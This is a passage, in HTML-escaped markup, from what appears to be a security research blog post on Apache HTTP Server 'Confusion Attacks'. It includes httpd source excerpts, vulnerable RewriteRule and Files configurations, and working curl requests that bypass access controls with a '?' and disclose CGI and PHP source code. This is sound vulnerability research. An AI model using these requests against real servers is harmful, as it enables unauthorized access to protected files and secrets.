        &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apache_was_here&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ignore query string if sent by Apache (RewriteRule) */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, PHP-FPM first normalizes the filename and splits it at the question mark &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; to extract the actual file path for execution (which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/admin.php&lt;/code&gt;). This leads to the bypass, and basically, &lt;strong&gt;all authentications or access controls based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; directive for a single PHP file are at risk when running together with PHP-FPM!&lt;/strong&gt; ğŸ˜®&lt;/p&gt;

&lt;p&gt;Many potentially risky configurations can be found on GitHub, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt; restricted to internal network access only:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# protect phpinfo, only allow localhost and local network access&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; php-info.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# LOCAL ACCESS ONLY&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Require local &lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# LOCAL AND LAN ACCESS&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; ip 10 172 192.168
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Adminer blocked by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; adminer.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Protected &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmlrpc.php&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; xmlrpc.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;CLI tools prevented from direct access:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;cron.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Through an inconsistency in how the authentication module and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; interpret the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; field, all the above examples can be successfully bypassed with just a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-2-documentroot-confusion&quot;&gt;ğŸ”¥ 2. DocumentRoot Confusion&lt;/h3&gt;

&lt;p&gt;The next attack weâ€™re diving into is the confusion based on DocumentRoot! Letâ€™s consider this Httpd configuration for a moment:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;DocumentRoot&lt;/span&gt; /var/www/html
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^/html/(.*)$   /$1.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When you visit the URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/html/about&lt;/code&gt;, which file do you think Httpd actually opens? Is it the one under the root directory, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/about.html&lt;/code&gt;, or is it from the DocumentRoot at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/about.html&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The answer is â€” &lt;strong&gt;it accesses both paths&lt;/strong&gt;. Yep, thatâ€™s our second Confusion Attack. &lt;strong&gt;For any&lt;sup&gt;[1]&lt;/sup&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;, Apache HTTP Server always tries to open both the path with DocumentRoot and without it!&lt;/strong&gt; Amazing, right? ğŸ˜‰&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] Located within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost Block&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939&quot;&gt;modules/mappers/mod_rewrite.c#L4939&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OPTION_LEGACY_PREFIX_DOCROOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;notes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mod_rewrite_uri_reduced&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefix_stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1] access without root&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_core_translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2] access with root&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixing with document_root of %s&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;&quot; FAILED&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixed with document_root to %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;go-ahead with %s [OK]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Most of the time, the version without DocumentRoot doesnâ€™t exist, so Apache HTTP Server goes for the version with the DocumentRoot. But this behavior already lets us â€œintentionallyâ€ access paths outside the Web Root. &lt;strong&gt;If today we can control the prefix of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;, couldnâ€™t we access any file on the system?&lt;/strong&gt; Thatâ€™s the spirit of our second Confusion Attack! You can find numerous problematic configurations on GitHub, and even &lt;a href=&quot;https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query&quot;&gt;the examples from official Apache HTTP Server documentations&lt;/a&gt; are vulnerable to attacks:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Remove mykey=???&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; &quot;%{QUERY_STRING}&quot; &quot;(.*(?:^|&amp;amp;))mykey=([^&amp;amp;]*)&amp;amp;?(.*)&amp;amp;?$&quot;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;(.*)&quot; &quot;$1?%1%3&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; that are also affected, such as rules based on caching needs or hiding file extensions:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The Rule trying to save bandwidth by opting for compressed versions of static files:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^(.*)\.(css|js|ico|svg)&quot; &quot;$1\.$2.gz&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The rule redirecting old URLs to the main site:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/oldwebsite/(.*)$&quot;  &quot;/$1&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The rule returning a 200 OK for all CORS preflight requests:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{REQUEST_METHOD} &lt;span class=&quot;ss&quot;&gt;OPTIONS&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^(.*)$ $1 [R=200,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Theoretically, as long as the target prefix of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; is controllable, we can access nearly the entire filesystem. But from the real-world cases  above, extensions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.html&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gz&lt;/code&gt; are the restrictions that keep us from being truly free. So, can we access files outside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.html&lt;/code&gt;? I am not sure if you remember the primitive of Path Truncation from the Filename Confusion earlier? By combining these two primitives, we can freely access arbitrary files on the filesystem!&lt;/p&gt;

&lt;p&gt;The following demonstrations are all based on this unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-2-1-server-side-source-code-disclosure&quot;&gt;âš”ï¸ Primitive 2-1. Server-Side Source Code Disclosure&lt;/h4&gt;

&lt;p&gt;Letâ€™s introduce the first primitive of DocumentRoot Confusion â€” &lt;strong&gt;Arbitrary Server-Side Source Code Disclosure&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Since Apache HTTP Server decides whether to consider a file as a Server-Side Script based on the current directory or virtual host configuration, accessing target via an absolute path can confuse Httpdâ€™s logic, causing it to leak contents that should have been executed as code.&lt;/p&gt;

&lt;h5 id=&quot;ï¸-2-1-1-disclose-cgi-source-code&quot;&gt;âœ”ï¸ 2-1-1. Disclose CGI Source Code&lt;/h5&gt;

&lt;p&gt;Starting with the disclosure of server-side CGI source code, since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; binds the CGI folder to a specified URL prefix via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt;, directly accessing a CGI file using its absolute path can leak its source code due to the change of URL prefix.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/cgi-bin/download.cgi
 &lt;span class=&quot;c&quot;&gt;# the processed result from download.cgi&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
 &lt;span class=&quot;c&quot;&gt;# #!/usr/bin/perl&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# use CGI;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# # the source code of download.cgi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;ï¸-2-1-2-disclose-php-source-code&quot;&gt;âœ”ï¸ 2-1-2. Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;Next is the disclosure of server-side PHP source code. Given that PHP has numerous use cases, if PHP environments are applied only to specific directories or virtual hosts (which is common in web hosting), accessing PHP files from a virtual host which didnâ€™t support PHP can disclose the source code!&lt;/p&gt;

&lt;p&gt;For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; are two websites hosted on the same server; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; allows PHP execution while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; only serves static files. Hence, you can disclose sensitive info from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.php&lt;/code&gt; like this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/config.php
 &lt;span class=&quot;c&quot;&gt;# the processed result (empty) from config.php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/var/www.local/config.php%3F &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: static.local&quot;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# the source code of config.php&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-2-2-local-gadgets-manipulation&quot;&gt;âš”ï¸ Primitive 2-2. Local Gadgets Manipulation!&lt;/h4&gt;

&lt;p&gt;Next up is our second primitive â€” &lt;strong&gt;Local Gadgets Manipulation&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;First, when we talked about â€œaccessing any file on the filesystem,â€ did you wonder: â€œHey, could an unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;?â€ The answer is Yes, and also no. What?&lt;/p&gt;

